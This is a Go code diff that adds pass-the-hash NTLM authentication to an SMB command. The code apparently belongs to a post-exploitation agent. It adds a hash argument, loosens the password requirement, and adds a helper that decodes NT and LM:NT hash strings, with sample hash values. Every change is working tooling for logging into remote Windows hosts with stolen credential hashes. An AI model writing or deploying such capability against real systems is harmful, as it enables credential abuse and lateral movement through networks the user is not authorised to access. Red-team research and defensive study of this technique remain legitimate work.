@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -26,6 +27,7 @@ type smbArgs struct {
 	Path     string `json:"path"`     // file/directory path within share
 	Username string `json:"username"` // DOMAIN\user or user
 	Password string `json:"password"` // password
+	Hash     string `json:"hash"`     // NTLM hash (pass-the-hash, hex-encoded NT hash)
 	Domain   string `json:"domain"`   // domain (optional, can be part of username)
 	Content  string `json:"content"`  // file content for upload action
 	Port     int    `json:"port"`     // SMB port (default: 445)
@@ -49,9 +51,9 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	if args.Host == "" || args.Username == "" || args.Password == "" {
+	if args.Host == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
 		return structs.CommandResult{
-			Output:    "Error: host, username, and password are required",
+			Output:    "Error: host, username, and password (or hash) are required",
 			Status:    "error",
 			Completed: true,
 		}
@@ -134,13 +136,24 @@ func smbConnect(args smbArgs) (*smb2.Session, error) {
 		return nil, fmt.Errorf("TCP connect to %s:%d: %v", args.Host, args.Port, err)
 	}
 
-	d := &smb2.Dialer{
-		Initiator: &smb2.NTLMInitiator{
-			User:     args.Username,
-			Password: args.Password,
-			Domain:   args.Domain,
-		},
+	initiator := &smb2.NTLMInitiator{
+		User:   args.Username,
+		Domain: args.Domain,
 	}
+
+	// Pass-the-hash: use NTLM hash directly instead of password
+	if args.Hash != "" {
+		hashBytes, err := smbDecodeHash(args.Hash)
+		if err != nil {
+			_ = conn.Close()
+			return nil, fmt.Errorf("invalid NTLM hash: %v", err)
+		}
+		initiator.Hash = hashBytes
+	} else {
+		initiator.Password = args.Password
+	}
+
+	d := &smb2.Dialer{Initiator: initiator}
 
 	session, err := d.Dial(conn)
 	if err != nil {
@@ -149,6 +162,25 @@ func smbConnect(args smbArgs) (*smb2.Session, error) {
 	}
 
 	return session, nil
+}
+
+// smbDecodeHash decodes an NTLM hash from various formats:
+// - Pure hex: "8846f7eaee8fb117ad06bdd830b7586c" (16 bytes = NT hash)
+// - LM:NT format: "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+func smbDecodeHash(hashStr string) ([]byte, error) {
+	hashStr = strings.TrimSpace(hashStr)
+	// Strip LM hash prefix if present (LM:NT format)
+	if parts := strings.SplitN(hashStr, ":", 2); len(parts) == 2 && len(parts[0]) == 32 && len(parts[1]) == 32 {
+		hashStr = parts[1] // Use NT hash part
+	}
+	hashBytes, err := hex.DecodeString(hashStr)
+	if err != nil {
+		return nil, fmt.Errorf("hash must be hex-encoded: %v", err)
+	}
+	if len(hashBytes) != 16 {
+		return nil, fmt.Errorf("NT hash must be 16 bytes (32 hex chars), got %d bytes", len(hashBytes))
+	}
+	return hashBytes, nil
 }
 
 func smbListShares(args smbArgs) structs.CommandResult {
